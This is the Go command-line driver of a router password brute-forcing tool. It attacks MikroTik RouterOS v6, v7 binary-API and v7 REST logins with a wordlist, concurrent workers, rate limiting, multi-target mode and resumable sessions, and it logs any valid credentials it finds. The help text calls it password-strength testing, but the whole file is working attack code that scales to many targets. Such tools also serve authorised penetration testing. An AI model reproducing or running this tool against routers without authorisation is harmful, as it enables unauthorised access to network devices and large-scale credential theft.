package main

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/nimda/router-brute/internal/interfaces"

	"github.com/nimda/router-brute/internal/core"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v6"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v7"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v7/rest"
	"github.com/nimda/router-brute/pkg/duallog"
	"github.com/rs/zerolog"
	zlog "github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
)

var (
	debugMode bool
	traceMode bool
)

var rootCmd = &cobra.Command{
	Use:   "router-brute",
	Short: "Router Brute-forcing Tool",
	Long:  "This tool tests password strength on various router platforms.",
	PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
		// Setup dual logging: STDOUT=complete log, STDERR=progress+success
		logLevel := zerolog.InfoLevel
		if traceMode {
			logLevel = zerolog.TraceLevel
		} else if debugMode {
			logLevel = zerolog.DebugLevel
		}
		duallog.Setup(logLevel)

		if traceMode {
			zlog.Trace().Msg("🔍🔍 TRACE MODE ENABLED")
		} else if debugMode {
			zlog.Debug().Msg("🔍 DEBUG MODE ENABLED")
		}

		// Validate common flags (skip for root command itself)
		if cmd.Name() == "router-brute" {
			return nil
		}

		target, _ := cmd.Flags().GetString("target")
		targetFile, _ := cmd.Flags().GetString("target-file")
		resumeFile, _ := cmd.Flags().GetString("resume")
		wordlist, _ := cmd.Flags().GetString("wordlist")

		// If resuming, target and wordlist are optional (loaded from resume file)
		if resumeFile != "" {
			return nil
		}

		// Normal mode validation
		if target == "" && targetFile == "" {
			return fmt.Errorf("either --target or --target-file must be specified")
		}
		if target != "" && targetFile != "" {
			return fmt.Errorf("cannot specify both --target and --target-file")
		}
		if wordlist == "" {
			return fmt.Errorf("--wordlist is required")
		}

		return nil
	},
}

var mikrotikV6Cmd = &cobra.Command{
	Use:   "mikrotik-v6",
	Short: "Brute force MikroTik RouterOS v6",
	Run:   runMikrotikV6,
}

var mikrotikV7Cmd = &cobra.Command{
	Use:   "mikrotik-v7",
	Short: "Brute force MikroTik RouterOS v7 (binary API)",
	Run:   runMikrotikV7,
}

var mikrotikV7RestCmd = &cobra.Command{
	Use:   "mikrotik-v7-rest",
	Short: "Brute force MikroTik RouterOS v7 (REST API)",
	Run:   runMikrotikV7Rest,
}

func init() {
	// Global flags (logging)
	rootCmd.PersistentFlags().BoolVar(&debugMode, "debug", false, "Enable debug logging")
	rootCmd.PersistentFlags().BoolVar(&traceMode, "trace", false, "Enable trace logging")

	// Common attack flags (shared by all protocols)
	rootCmd.PersistentFlags().String("target", "", "Router IP address or hostname")
	rootCmd.PersistentFlags().String("user", "admin", "Username to test")
	rootCmd.PersistentFlags().String("wordlist", "", "Path to password wordlist file")
	rootCmd.PersistentFlags().Int("workers", 5, "Number of concurrent workers")
	rootCmd.PersistentFlags().String("rate", "100ms", "Rate limit between attempts")
	rootCmd.PersistentFlags().String("timeout", "5s", "Connection timeout")
	rootCmd.PersistentFlags().String("max-timeout", "15s", "Maximum timeout (adaptive timeout limit)")
	rootCmd.PersistentFlags().Int("max-conseq-err-per-host", 5, "Maximum consecutive errors before marking host as dead")
	rootCmd.PersistentFlags().String("target-file", "", "File containing target specifications (multi-target mode)")
	rootCmd.PersistentFlags().Int("concurrent-targets", 1, "Number of targets to attack simultaneously")

	// Resume functionality flags (shared by all protocols)
	rootCmd.PersistentFlags().String("resume", "", "Resume from a previous session (path to resume file)")
	rootCmd.PersistentFlags().String("save-progress", "30s", "Auto-save progress interval (0 to disable)")
	rootCmd.PersistentFlags().String("save-dir", "./resume", "Directory to save resume files")

	// Protocol-specific flags with different defaults
	mikrotikV6Cmd.Flags().Int("port", 8728, "RouterOS v6 API port")
	mikrotikV7Cmd.Flags().Int("port", 8729, "RouterOS v7 API port")
	mikrotikV7RestCmd.Flags().Int("port", 80, "RouterOS v7 REST API port")

	// Module-specific flags
	mikrotikV7RestCmd.Flags().Bool("https", false, "Use HTTPS instead of HTTP")

	// Add commands to root
	rootCmd.AddCommand(mikrotikV6Cmd)
	rootCmd.AddCommand(mikrotikV7Cmd)
	rootCmd.AddCommand(mikrotikV7RestCmd)
}

// AttackConfig holds configuration for an attack
type AttackConfig struct {
	target            string
	user              string
	wordlist          string
	workers           int
	port              int
	timeout           time.Duration
	rateLimit         time.Duration
	targetFile        string
	concurrentTargets int
	moduleFactory     func() interfaces.RouterModule
	multiFactory      interfaces.ModuleFactory

	// Resume functionality
	resumeFile           string
	saveProgressInterval time.Duration
	saveDir              string
}

// parseAttackConfig parses attack configuration from command flags
func parseAttackConfig(cmd *cobra.Command) *AttackConfig {
	target, _ := cmd.Flags().GetString("target")
	user, _ := cmd.Flags().GetString("user")
	wordlist, _ := cmd.Flags().GetString("wordlist")
	workers, _ := cmd.Flags().GetInt("workers")
	port, _ := cmd.Flags().GetInt("port")
	timeout, _ := cmd.Flags().GetString("timeout")
	rateLimit, _ := cmd.Flags().GetString("rate")
	targetFile, _ := cmd.Flags().GetString("target-file")
	concurrentTargets, _ := cmd.Flags().GetInt("concurrent-targets")
	resumeFile, _ := cmd.Flags().GetString("resume")
	saveProgress, _ := cmd.Flags().GetString("save-progress")
	saveDir, _ := cmd.Flags().GetString("save-dir")

	rateDuration, err := time.ParseDuration(rateLimit)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Invalid rate limit")
	}

	timeoutDuration, err := time.ParseDuration(timeout)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Invalid timeout")
	}

	var saveProgressInterval time.Duration
	if saveProgress != "" && saveProgress != "0" && saveProgress != "0s" {
		saveProgressInterval, err = time.ParseDuration(saveProgress)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Invalid save-progress interval")
		}
	}

	return &AttackConfig{
		target:               target,
		user:                 user,
		wordlist:             wordlist,
		workers:              workers,
		port:                 port,
		timeout:              timeoutDuration,
		rateLimit:            rateDuration,
		targetFile:           targetFile,
		concurrentTargets:    concurrentTargets,
		resumeFile:           resumeFile,
		saveProgressInterval: saveProgressInterval,
		saveDir:              saveDir,
	}
}

// runAttack executes an attack based on the configuration
func runAttack(cfg *AttackConfig) {
	zlog.Debug().Msg("Loading passwords from wordlist")
	passwords, err := loadPasswords(cfg.wordlist)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Failed to load wordlist")
	}
	zlog.Debug().Int("n", len(passwords)).Msg("Loaded n passwords")

	if cfg.targetFile != "" {
		// Multi-target mode
		zlog.Info().Str("file", cfg.targetFile).Msg("Running in multi-target mode")
		runMultiTarget(cfg)
		return
	}

	// Single-target mode

	zlog.Info().
		Str("target", cfg.target).
		Int("passwords", len(passwords)).
		Int("workers", cfg.workers).
		Str("rate", cfg.rateLimit.String()).
		Msg("Starting attack")

	zlog.Debug().Msg("Creating module")
	module := cfg.moduleFactory()
	if err := module.Initialize(cfg.target, cfg.user, map[string]interface{}{
		"port":    cfg.port,
		"timeout": cfg.timeout,
	}); err != nil {
		zlog.Fatal().Err(err).Msg("Failed to initialize module")
	}

	// Pre-flight connection check
	zlog.Debug().Msg("Testing connection to target...")
	ctx, cancel := context.WithTimeout(context.Background(), cfg.timeout)
	if err := module.Connect(ctx); err != nil {
		cancel()
		zlog.Fatal().Err(err).Str("target", cfg.target).Int("port", cfg.port).Msg("Failed to connect to target")
	}
	cancel()
	zlog.Info().Str("target", cfg.target).Int("port", cfg.port).Msg("Connection test successful")
	// Close the test connection - workers will reconnect
	if err := module.Close(); err != nil {
		zlog.Debug().Err(err).Msg("Error closing test connection")
	}

	zlog.Debug().Int("workers", cfg.workers).Dur("ratelimit", cfg.rateLimit).Msg("Creating engine")
	engine := core.NewEngine(cfg.workers, cfg.rateLimit)
	engine.SetModule(module)
	engine.LoadPasswords(passwords)

	zlog.Debug().Msg("Starting engine...")
	if err := engine.Start(); err != nil {
		zlog.Fatal().Err(err).Msg("Failed to start engine")
	}
	zlog.Debug().Msg("Engine started successfully")

	zlog.Debug().Msg("Waiting for results...")
	successCount := 0
	totalAttempts := 0
	errorCount := 0

	// Consume errors in background
	go func() {
		for err := range engine.Errors() {
			errorCount++
			zlog.Error().Err(err).Msg("Attack error")
		}
	}()

	for result := range engine.Results() {
		totalAttempts++
		zlog.Trace().
			Int("attempt", totalAttempts).
			Str("password", result.Password).
			Dur("elapsed", result.TimeConsumed).
			Msg("Received result")

		if result.Success {
			successCount++
			zlog.Info().
				Str("username", result.Username).
				Str("password", result.Password).
				Str("target", result.Target).
				Str("module", result.ModuleName).
				Msg("✓ SUCCESS")

			zlog.Debug().Msg("Found valid credentials, stopping engine...")
			engine.Stop()
			zlog.Debug().Msg("Engine stopped")
			break
		}

		if totalAttempts%10 == 0 {
			progress := engine.Progress() * 100
			fmt.Printf("Progress: %.1f%% (%d/%d attempts)\r", progress, totalAttempts, len(passwords))
		}
	}

	zlog.Debug().
		Int("total_attempts", totalAttempts).
		Int("successes", successCount).
		Msg("Results loop completed")

	zlog.Info().Msg("Attack completed")
	zlog.Info().Int("total_attempts", totalAttempts).Msg("Total attempts")
	zlog.Info().Int("successful_attempts", successCount).Msg("Successful authentications")

	if successCount == 0 {
		zlog.Info().Msg("No valid credentials found")
	}
	zlog.Debug().Msg("Attack completed")
}

// runMultiTarget executes a multi-target attack
func runMultiTarget(cfg *AttackConfig) {
	var resumeState *core.ResumeState
	var passwords []string
	var targets []*core.Target
	var err error

	// Check if resuming from a previous session
	if cfg.resumeFile != "" {
		zlog.Info().Str("file", cfg.resumeFile).Msg("Resuming from previous session")
		resumeState, err = core.LoadResumeState(cfg.resumeFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load resume file")
		}

		// Print resume summary
		resumeState.PrintSummary()

		// Load passwords from the file specified in resume state
		passwords, err = loadPasswords(resumeState.PasswordFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load wordlist from resume state")
		}

		// Convert resume state targets to core.Target
		targets = make([]*core.Target, len(resumeState.Targets))
		for i, tp := range resumeState.Targets {
			targets[i] = &core.Target{
				IP:       tp.IP,
				Port:     tp.Port,
				Username: tp.Username,
			}
		}

		// Override configuration from resume state
		cfg.user = resumeState.Username
		cfg.workers = resumeState.Workers
		rateDuration, err := time.ParseDuration(resumeState.RateLimit)
		if err == nil {
			cfg.rateLimit = rateDuration
		}

		zlog.Info().
			Int("total_targets", len(targets)).
			Int("total_passwords", len(passwords)).
			Msg("Resumed session configuration")
	} else {
		// Normal mode - load from files
		zlog.Info().Str("file", cfg.targetFile).Msg("Loading targets for multi-target attack")

		// Load targets
		parser := core.NewTargetParser("", cfg.port) // Empty default command
		targets, err = parser.ParseTargetFile(cfg.targetFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load targets")
		}

		if len(targets) == 0 {
			zlog.Fatal().Msg("No valid targets found in file")
		}

		// Load passwords
		passwords, err = loadPasswords(cfg.wordlist)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load wordlist")
		}

		// Create new resume state
		resumeState = &core.ResumeState{
			Protocol:     cfg.multiFactory.GetProtocolName(),
			Username:     cfg.user,
			PasswordFile: cfg.wordlist,
			TargetFile:   cfg.targetFile,
			Workers:      cfg.workers,
			RateLimit:    cfg.rateLimit.String(),
			Targets:      make([]core.TargetProgress, len(targets)),
		}

		// Initialize target progress
		for i, target := range targets {
			resumeState.Targets[i] = core.TargetProgress{
				IP:             target.IP,
				Port:           target.Port,
				Username:       target.Username,
				PasswordsTried: 0,
				Completed:      false,
				Success:        false,
			}
		}
	}

	// Create progress tracker
	var tracker *core.ProgressTracker
	if cfg.saveProgressInterval > 0 {
		tracker = core.NewProgressTracker(resumeState, cfg.saveDir, cfg.saveProgressInterval, true)
		zlog.Info().
			Dur("interval", cfg.saveProgressInterval).
			Str("directory", cfg.saveDir).
			Msg("Progress auto-save enabled")
	}

	// Create multi-target engine
	factory := cfg.multiFactory
	engine := core.NewMultiTargetEngine(factory, cfg.workers, cfg.concurrentTargets, cfg.rateLimit)
	engine.LoadTargets(targets)
	engine.LoadPasswords(passwords)

	// Set progress tracker if enabled
	if tracker != nil {
		engine.SetProgressTracker(tracker)
	}

	// Start attack
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start progress tracker
	if tracker != nil {
		tracker.Start(ctx)
		defer tracker.Stop()
	}

	engine.Start(ctx)

	// Process results
	successCount := 0
	for result := range engine.GetResults() {
		if result.Success {
			successCount++
			zlog.Info().
				Str("target", result.Target.IP).
				Str("username", result.Target.Username).
				Str("password", result.SuccessPassword).
				Msg("✓ Found valid credentials")
		}
	}

	// Process errors
	errorCount := 0
	for err := range engine.GetErrors() {
		zlog.Error().
			Str("target", err.Target.IP).
			Err(err.Error).
			Msg("Error during attack")
		errorCount++
	}

	zlog.Info().
		Int("total_targets", len(targets)).
		Int("successful_targets", successCount).
		Int("failed_targets", errorCount).
		Msg("Multi-target attack completed")

	if successCount == 0 {
		zlog.Info().Msg("No valid credentials found in any target")
	}
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func runMikrotikV6(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	cfg.moduleFactory = func() interfaces.RouterModule {
		return v6.NewMikrotikV6Module()
	}
	cfg.multiFactory = &v6.MikrotikV6Factory{}

	zlog.Debug().Msg("Starting Mikrotik v6 attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v6 attack completed")
}

func runMikrotikV7(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	cfg.moduleFactory = func() interfaces.RouterModule {
		return v7.NewMikrotikV7Module()
	}
	cfg.multiFactory = &v7.MikrotikV7Factory{}

	zlog.Debug().Msg("Starting Mikrotik v7 attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v7 attack completed")
}

func runMikrotikV7Rest(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	// Note: useHTTPS flag is defined but not currently used in the REST module

	cfg.moduleFactory = func() interfaces.RouterModule {
		return rest.NewMikrotikV7RestModule()
	}
	cfg.multiFactory = &rest.MikrotikV7RestFactory{}

	zlog.Debug().Msg("Starting Mikrotik v7 REST attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v7 REST attack completed")
}

func loadPasswords(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var passwords []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			passwords = append(passwords, line)
		}
	}
	return passwords, nil
}
